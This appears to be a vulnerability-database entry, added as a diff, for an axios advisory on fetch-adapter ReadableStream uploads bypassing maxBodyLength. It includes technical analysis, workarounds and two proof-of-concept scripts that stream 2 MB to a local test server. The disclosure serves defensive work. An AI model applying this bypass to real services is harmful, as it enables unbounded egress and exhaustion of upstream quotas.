@@ -1,0 +1,297 @@
+[basic]
+description = '''
+## Summary
+
+axios’ fetch adapter does not enforce `maxBodyLength` for live WHATWG `ReadableStream` request bodies whose size cannot be determined before dispatch. Applications that use `adapter: \"fetch\"` and rely on `maxBodyLength` to cap untrusted upload/proxy streams can send the full stream even when it exceeds the configured limit.
+
+This affects fetch-adapter usage in edge runtimes where fetch is selected, and in Node.js or browser environments where the fetch adapter is explicitly selected. The HTTP adapter’s stream upload path is not affected.
+
+## Impact
+
+An attacker who can supply or influence a streamed request body can bypass the caller’s configured upload-size limit. Practical impact is unexpected outbound network egress, request-level resource consumption, and possible exhaustion of upstream API quotas or bandwidth.
+
+This does not expose response data, execute code, or modify axios configuration. Exploitability depends on an application passing attacker-controlled, unknown-length stream data to axios and relying on `maxBodyLength` as the size guard.
+
+## Affected Functionality
+
+Affected:
+- `adapter: \"fetch\"` or environments where axios selects the fetch adapter.
+- Request methods with bodies, such as `POST`, `PUT`, and `PATCH`.
+- `data` as a WHATWG `ReadableStream` without a reliable `Content-Length`.
+- Configurations that set `maxBodyLength` to a finite value.
+
+Not affected:
+- Axios versions before the fetch adapter was introduced.
+- The Node HTTP adapter stream enforcement path.
+- Known-length fetch-adapter bodies in `1.16.0+`, such as strings, `Blob`, `ArrayBuffer`, `ArrayBufferView`, URLSearchParams, spec-compliant FormData, or requests with a finite `Content-Length`.
+
+## Technical Details
+
+In `lib/adapters/fetch.js`, `getBodyLength()` handles null bodies, `Blob`, spec-compliant FormData, ArrayBuffer values, URLSearchParams, and strings. It has no branch for `ReadableStream`, so `resolveBodyLength(headers, data)` returns `undefined` when no finite `Content-Length` header is present.
+
+The `maxBodyLength` check only throws when the resolved outbound length is a finite number greater than the configured limit. For live streams, the check is skipped and the stream is passed to `fetch()`.
+
+When `onUploadProgress` is enabled, axios wraps the request body with `trackStream()`, but that wrapper only reports progress. It does not receive `maxBodyLength` and does not abort once loaded bytes exceed the cap.
+
+The expected behavior exists in the HTTP adapter: `lib/adapters/http.js` enforces `maxBodyLength` for streamed uploads by counting chunks and rejecting with `ERR_BAD_REQUEST`.
+
+## Proof of Concept of Attack
+
+Run from the axios repo root on Node 18+ against an affected version:
+
+```js
+import http from 'node:http';
+import axios from './index.js';
+
+const LIMIT = 1024;
+const PAYLOAD_BYTES = 2 * 1024 * 1024;
+
+const server = http.createServer((req, res) => {
+  let received = 0;
+  req.on('data', (chunk) => {
+    received += chunk.length;
+  });
+  req.on('end', () => {
+    res.writeHead(200, { 'content-type': 'application/json' });
+    res.end(JSON.stringify({ received, limit: LIMIT }));
+  });
+});
+
+await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+const { port } = server.address();
+
+function makeReadableStream(totalBytes) {
+  const chunk = new Uint8Array(64 * 1024).fill(0x42);
+  let remaining = totalBytes;
+
+  return new ReadableStream({
+    pull(controller) {
+      if (remaining <= 0) {
+        controller.close();
+        return;
+      }
+
+      const next = remaining >= chunk.length ? chunk : chunk.subarray(0, remaining);
+      remaining -= next.length;
+      controller.enqueue(next);
+    },
+  });
+}
+
+try {
+  const response = await axios.post(
+    `http://127.0.0.1:${port}/upload`,
+    makeReadableStream(PAYLOAD_BYTES),
+    {
+      adapter: 'fetch',
+      maxBodyLength: LIMIT,
+      headers: { 'content-type': 'application/octet-stream' },
+    }
+  );
+
+  console.log(response.data);
+} finally {
+  server.close();
+}
+```
+
+Expected vulnerable result: the server reports `received: 2097152` even though `maxBodyLength` is `1024`.
+
+## Workarounds
+
+Use the HTTP adapter for untrusted stream uploads in Node.js where possible, or wrap/count the stream at the application layer and abort it when it exceeds the intended limit. Do not rely on fetch-adapter `maxBodyLength` for unknown-length `ReadableStream` bodies until a fixed axios version is available.
+
+<details>
+<summary>Original Report</summary>
+
+### Summary
+axios's fetch adapter (used in browsers, edge runtimes, and Node 18+ when explicitly selected) ignores maxBodyLength for live ReadableStream request bodies whose size cannot be inferred ahead of dispatch. The pre-dispatch check is skipped when the length is unknown, and the in-flight wrapper that runs during transmission only emits progress events — it never enforces a byte cap. Severity: medium.
+
+### Details
+In lib/adapters/fetch.js, body-length resolution has no ReadableStream branch:
+
+fetch.js Lines 121-155
+```
+  const getBodyLength = async (body) => {
+    if (body == null) {
+      return 0;
+    }
+    if (utils.isBlob(body)) {
+      return body.size;
+    }
+    if (utils.isSpecCompliantForm(body)) {
+      const _request = new Request(platform.origin, {
+        method: 'POST',
+        body,
+      });
+      return (await _request.arrayBuffer()).byteLength;
+    }
+    if (utils.isArrayBufferView(body) || utils.isArrayBuffer(body)) {
+      return body.byteLength;
+    }
+    if (utils.isURLSearchParams(body)) {
+      body = body + '';
+    }
+    if (utils.isString(body)) {
+      return (await encodeText(body)).byteLength;
+    }
+  };
+  const resolveBodyLength = async (headers, body) => {
+    const length = utils.toFiniteNumber(headers.getContentLength());
+    return length == null ? getBodyLength(body) : length;
+  };
+```
+
+For a live ReadableStream, resolveBodyLength returns undefined. The pre-dispatch maxBodyLength check then short-circuits because the value is not finite:
+
+fetch.js Lines 214-232
+```
+      // Enforce maxBodyLength against the outbound request body before dispatch.
+      // Mirrors http.js behavior (ERR_BAD_REQUEST / 'Request body larger than
+      // maxBodyLength limit'). Skip when the body length cannot be determined
+      // (e.g. a live ReadableStream supplied by the caller).
+      if (hasMaxBodyLength && method !== 'get' && method !== 'head') {
+        const outboundLength = await resolveBodyLength(headers, data);
+        if (
+          typeof outboundLength === 'number' &&
+          isFinite(outboundLength) &&
+          outboundLength > maxBodyLength
+        ) {
+          throw new AxiosError(
+            'Request body larger than maxBodyLength limit',
+            AxiosError.ERR_BAD_REQUEST,
+            config,
+            request
+          );
+        }
+      }
+```
+
+The in-flight stream wrapper that follows is purely for progress reporting; it neither sees maxBodyLength nor aborts the request when bytes exceed any cap:
+
+fetch.js Lines 253-261
+```
+        if (_request.body) {
+          const [onProgress, flush] = progressEventDecorator(
+            requestContentLength,
+            progressEventReducer(asyncDecorator(onUploadProgress))
+          );
+          data = trackStream(_request.body, DEFAULT_CHUNK_SIZE, onProgress, flush);
+        }
+```
+The body therefore reaches fetch() unbounded, and the entire payload is transmitted regardless of maxBodyLength.
+
+### PoC
+```
+import http from 'node:http';
+import axios from '../../index.js';
+
+const LIMIT = 1024;
+const PAYLOAD_BYTES = 2 * 1024 * 1024;
+
+const server = http.createServer((req, res) => {
+  let received = 0;
+  req.on('data', (chunk) => {
+    received += chunk.length;
+  });
+  req.on('end', () => {
+    res.writeHead(200, { 'content-type': 'application/json' });
+    res.end(JSON.stringify({ received, limit: LIMIT }));
+  });
+  req.on('error', () => {
+    /* swallow client-side aborts */
+  });
+});
+
+await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
+const port = server.address().port;
+
+function makeReadableStream(totalBytes) {
+  const CHUNK = new Uint8Array(64 * 1024).fill(0x42);
+  let remaining = totalBytes;
+  return new ReadableStream({
+    pull(controller) {
+      if (remaining <= 0) {
+        controller.close();
+        return;
+      }
+      const next = remaining >= CHUNK.length ? CHUNK : CHUNK.subarray(0, remaining);
+      remaining -= next.length;
+      controller.enqueue(next);
+    },
+  });
+}
+
+try {
+  let result;
+  try {
+    const response = await axios.post(
+      `http://127.0.0.1:${port}/upload`,
+      makeReadableStream(PAYLOAD_BYTES),
+      {
+        adapter: 'fetch',
+        maxBodyLength: LIMIT,
+        headers: { 'content-type': 'application/octet-stream' },
+        // No content-length: the stream's total length is unknown ahead of
+        // dispatch, which is exactly the vulnerable code path.
+      }
+    );
+    result = { status: response.status, data: response.data };
+  } catch (err) {
+    result = { error: err && (err.code || err.message) };
+  }
+
+  console.log('--- PoC: fetch adapter ReadableStream maxBodyLength bypass ---');
+  console.log('axios result:', JSON.stringify(result));
+
+  const ok =
+    result &&
+    result.status === 200 &&
+    result.data &&
+    typeof result.data === 'object' &&
+    result.data.received === PAYLOAD_BYTES &&
+    result.data.limit === LIMIT;
+
+  if (ok) {
+    console.log(
+      `VULNERABLE: server received ${result.data.received} bytes despite ` +
+        `maxBodyLength=${LIMIT}.`
+    );
+    process.exitCode = 0;
+  } else {
+    console.log('NOT VULNERABLE: axios refused or truncated the oversized ReadableStream.');
+    process.exitCode = 1;
+  }
+} finally {
+  server.close();
+}
+```
+
+### Impact
+- Uncontrolled egress when proxying user-controlled streams (e.g. file uploads, log forwarding, AI streaming endpoints).
+- Bypass of cost / quota guards on upstream APIs.
+- Resource exhaustion against the runtime's network stack and against upstream peers.
+</details>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Axios: Fetch adapter `ReadableStream` uploads bypass `maxBodyLength`"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-jqh4-m9w3-8hp9"]
+ave_id = "AVE-2026-1143"
+
+[meta]
+collected_at = "2026-08-06T07:11:04.401113998+00:00"
+status = "completed"
+
+[references]
+urls = []
